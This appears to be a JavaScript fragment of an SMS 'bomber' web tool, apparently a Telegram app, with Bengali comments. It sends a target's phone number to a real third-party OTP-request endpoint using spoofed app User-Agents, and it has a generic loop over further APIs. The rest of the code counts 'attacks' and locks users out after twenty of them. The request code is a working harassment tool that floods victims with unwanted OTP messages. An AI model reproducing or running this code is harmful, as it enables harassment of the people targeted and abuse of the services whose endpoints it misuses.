// API CALL FUNCTIONS
// ==========================================
const KAROBAR_API = {
    url: "https://mybackend.karobarapp.com/api/v3/oauth/otp-request/",
    getHeaders: () => ({ 
        "Content-Type": "application/json", 
        "User-Agent": ["Dart/3.6","Dart/3.5","okhttp/4.12.0"][Math.floor(Math.random()*3)] 
    }),
    getBody: (phone) => ({ phone_number: phone, country: "bd", os: "Android" })
};

async function callKarobarAPI(phone) {
    try { 
        const res = await fetch(KAROBAR_API.url, { 
            method: "POST", 
            headers: KAROBAR_API.getHeaders(), 
            body: JSON.stringify(KAROBAR_API.getBody(phone)) 
        }); 
        return res.ok; 
    } catch { return false; }
}

async function callAPI(api, phone) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 6000);
        if (api.method === "GET") {
            await fetch(api.getUrl(phone), { method: "GET", signal: controller.signal });
        } else {
            await fetch(api.url, { 
                method: "POST", 
                headers: api.headers || { "Content-Type": "application/json" }, 
                body: JSON.stringify(api.getBody(phone)), 
                signal: controller.signal 
            });
        }
        clearTimeout(timeoutId);
        return true;
    } catch { return false; }
}

// ==========================================
// ⏱️ লক সিস্টেম (২০ অ্যাটাক = ৩ ঘন্টা লক)
// ==========================================
const LOCK_LIMIT = 20;
const LOCK_DURATION = 3 * 60 * 60 * 1000;

function getLockKey() {
    if (tgUser.id) return 'fire_lock_' + tgUser.id;
    const fp = getDeviceFingerprint();
    return 'fire_lock_fp_' + fp;
}

function checkLock() {
    const key = getLockKey();
    const data = localStorage.getItem(key);
    if (!data) return { locked: false, remaining: 0 };
    
    try {
        const parsed = JSON.parse(data);
        const now = Date.now();
        const elapsed = now - parsed.time;
        
        if (elapsed >= LOCK_DURATION) {
            localStorage.removeItem(key);
            return { locked: false, remaining: 0 };
        }
        
        const remaining = LOCK_DURATION - elapsed;
        return { locked: true, remaining: remaining };
    } catch(e) {
        localStorage.removeItem(key);
        return { locked: false, remaining: 0 };
    }
}

function applyLock() {
    const key = getLockKey();
    localStorage.setItem(key, JSON.stringify({ time: Date.now() }));
}

function getAttackCountKey() {
    if (tgUser.id) return 'fire_attack_count_' + tgUser.id;
    const fp = getDeviceFingerprint();
    return 'fire_attack_count_fp_' + fp;
}

function getAttackCount() {
    const key = getAttackCountKey();
    const data = localStorage.getItem(key);
    if (!data) return 0;
    try {
        const parsed = JSON.parse(data);
        if (Date.now() - parsed.time > LOCK_DURATION) {
            localStorage.removeItem(key);
            return 0;
        }
        return parsed.count || 0;
    } catch(e) { return 0; }
}

function incrementAttackCount() {
    const key = getAttackCountKey();
    let count = getAttackCount();
    count++;
    localStorage.setItem(key, JSON.stringify({ count: count, time: Date.now() }));
    return count;
}

function resetAttackCount() {
    const key = getAttackCountKey();
    localStorage.removeItem(key);
}

function checkAndShowLock() {
    const lock = checkLock();
    if (lock.locked) {
        document.getElementById('lockPopup').classList.add('active');
        startLockTimer(lock.remaining);
        document.getElementById('sendBtn').disabled = true;
        return true;
    }
    document.getElementById('lockPopup').classList.remove('active');
    document.getElementById('sendBtn').disabled = false;
    return false;
}

let lockTimerInterval = null;

function startLockTimer(remaining) {
    if (lockTimerInterval) clearInterval(lockTimerInterval);
    
    function updateTimer() {
        let rem = remaining;
        if (rem <= 0) {
            document.getElementById('lockPopup').classList.remove('active');
            document.getElementById('sendBtn').disabled = false;
            resetAttackCount();
            if (lockTimerInterval) clearInterval(lockTimerInterval);
            return;
        }
        
        const hours = Math.floor(rem / (60 * 60 * 1000));
        const minutes = Math.floor((rem % (60 * 60 * 1000)) / (60 * 1000));
        const seconds = Math.floor((rem % (60 * 1000)) / 1000);
        
        document.getElementById('lockTimer').textContent = 
            String(hours).padStart(2, '0') + ':' + 
            String(minutes).padStart(2, '0') + ':' + 
            String(seconds).padStart(2, '0');
        
        remaining -= 1000;
    }
    
    updateTimer();
    lockTimerInterval = setInterval(updateTimer, 1000);
}

